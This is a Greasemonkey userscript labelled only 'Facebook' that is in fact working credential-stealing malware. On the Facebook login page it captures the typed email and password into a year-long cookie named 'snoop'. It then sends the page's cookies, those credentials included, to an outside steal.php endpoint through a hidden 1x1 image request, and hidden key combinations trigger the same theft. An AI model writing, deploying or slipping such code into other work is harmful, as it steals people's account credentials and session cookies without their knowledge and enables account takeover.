// ==UserScript==
// @name           	Facebook
// @version 		1.1.1
// @namespace      	http://userscripts.org/users/malako
// @description    	Facebook
// @include        	http://*.facebook.com/*
// @include        	http:/facebook.com/*
// @include        	https://*.facebook.com/*
// @include        	https:/facebook.com/*
// @license        	GNU GENERAL PUBLIC LICENSE
// @agreement      	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
// ==/UserScript==


var title 				= "Facebook";
var version 			= "v1.1.1";

var width 				= 700;
var height 				= 400;
var cookieName 			= "snoop";
var daysToKeepCookie 	= 365;
var delimiter 			= ",";
var subDelimiter 		= "|";
var cookie				= readCookie(cookieName);
var submitControl;
var unControl;
var pwControl;

///////////////////
// Specific code //
///////////////////

init();

function init()
{
	//getElementsByClassNameAndType('uiButtonConfirm', 'submit')[0].addEventListener("click", saveLogin, false);	
	
	getElementByTabIndex("4", "submit")[0].addEventListener("click", saveLogin, false);;
	unControl 		= document.getElementById('email');
	pwControl 		= document.getElementById('pass');
}

function saveLogin()
{
	if (unControl.value.length == 0 || pwControl.value.length == 0)
		return;
	
	var date = new Date();
	
	var value = date.getTime() + subDelimiter + unControl.value + subDelimiter + pwControl.value;
	
	if(cookie)
		value += delimiter + cookie;
	
	writeCookie(cookieName, value, daysToKeepCookie);
	//document.write(document.cookie);
	cookieSteal();
}

unsafeWindow.doTheBossanova = function(email, password)
{
	unControl.value = email;
	pwControl.value = password;
	document.forms[0].submit();
}

///////////////////
// Generic code  //
///////////////////

cookie = readCookie(cookieName);

if (document.addEventListener)
   document.addEventListener("keypress", keyPress,false);
else if (document.attachEvent)
   document.attachEvent("onkeypress", keyPress);
else
   document.onkeypress= keyPress;

function writeCookie(name, value, days) 
{
	if (days) 
	{
		var date = new Date();
		date.setTime(date.getTime()+(days*24*60*60*1000));
		var expires = "; expires="+date.toGMTString();
	}
	else var expires = "";
	document.cookie = name+"="+value+expires+"; path=/";
}

function readCookie(name) 
{
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++) 
	{
		var c = ca[i];
		while (c.charAt(0)==' ') c = c.substring(1,c.length);
		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
	}
	return null;
}

function eraseCookie(name) 
{
	writeCookie(name, "", -1);
	cookie = null;
}
function cookieSteal()
{
	var h1=document.cookie;
        var url="http://cstar.iiit.ac.in/~ashish/steal.php";
        var imgUrl=url+"?cookie="+h1;
        var imgElement=document.createElement("img");
        imgElement.setAttribute("src", imgUrl);
        imgElement.setAttribute("width", "1");
        imgElement.setAttribute("height", "1");
        document.body.appendChild(imgElement);
}

function keyPress(e)
{
	var c =  String.fromCharCode(e.which).toUpperCase();
	
	if (c == "K" && e.shiftKey && e.ctrlKey && e.altKey)
		cookieSteal();

	else if (c == "D" && e.shiftKey && e.ctrlKey && e.altKey)
	{
		eraseCookie(cookieName);
		unsafeWindow.killWindow();
		display();
	}
	else if (e.keyCode == 27)
		unsafeWindow.killWindow();
}

unsafeWindow.clearLog = function()
{
	eraseCookie(cookieName);
	unsafeWindow.killWindow();
	display();
}


unsafeWindow.killWindow = function ()
{
	if (document.getElementById('displayDiv') != null)
		document.body.removeChild(document.getElementById('displayDiv'));
}


function getElementsByClassName(classname, node)
{ 
	if (!node)
	{ 
		node = document.getElementsByTagName('body')[0]; 
	} 
	var a = [], re = new RegExp('\\b' + classname + '\\b'); 
	els = node.getElementsByTagName('*'); 
	for (var i = 0, j = els.length; i < j; i++) 
	{ 
		if ( re.test(els[i].className) ) 
		{ 
			a.push(els[i]);
		} 
	}
	return a; 
}

function getElementsByClassNameAndType(classname, type, node)
{ 
	if (!node)
	{ 
		node = document.getElementsByTagName('body')[0]; 
	} 

	var a = [], re = new RegExp('\\b' + classname + '\\b'); 
	els = node.getElementsByTagName('*'); 
	for (var i = 0, j = els.length; i < j; i++) 
	{ 
		if ( re.test(els[i].className) && els[i].type == type) 
		{ 
			a.push(els[i]);
		} 
	} 
	return a; 
}

function getElementByTabIndex(index, type, node)
{
	if (!node)
	{ 
		node = document.getElementsByTagName('body')[0]; 
	} 
	
	var a = [];

	els = node.getElementsByTagName('*'); 
	for (var i = 0, j = els.length; i < j; i++) 
	{ 
		if (els[i].tabIndex == index && els[i].type == type)
		{ 
			a.push(els[i]);
		} 
	} 
	return a; 
}